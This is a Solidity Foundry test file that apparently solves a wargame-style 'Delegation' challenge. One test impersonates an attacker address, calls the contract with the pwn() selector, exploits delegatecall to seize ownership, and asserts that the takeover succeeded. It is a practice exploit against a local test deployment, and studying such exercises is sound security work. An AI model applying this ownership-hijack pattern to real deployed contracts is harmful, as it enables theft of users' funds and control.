// SPDX-License-Identifier: MIT
pragma solidity ^0.8.18;

import {Test, console} from "forge-std/Test.sol";
import {Delegation, Delegate} from "../../src/Delegation.sol";
import {DeployDelegation} from "../../script/deploy/DeployDelegation.s.sol";

contract DelegationTest is Test {
    DeployDelegation deployDelegation;
    Delegation delegation;
    Delegate delegate;

    address TEST_USER_ATTACKER = makeAddr("userAttacker");
    uint256 constant STARTTING_BALANCE = 100 ether;

    function setUp() external {
        vm.deal(TEST_USER_ATTACKER, STARTTING_BALANCE);

        deployDelegation = new DeployDelegation();
        (delegation, delegate) = deployDelegation.run();
    }

    function testOwnerIsSenderasd() public {
        console.log(delegate.owner());
        console.log(msg.sender);
        console.log(address(this));
        assertEq(delegate.owner(), address(this));
    }

    function testAttackerChangeOwner() public {
        vm.startPrank(TEST_USER_ATTACKER);
        (bool output,) = address(delegation).call(abi.encodeWithSelector(Delegate.pwn.selector));
        require(output, "Fail call");
        vm.stopPrank();

        assertEq(delegation.owner(), TEST_USER_ATTACKER);
    }
}
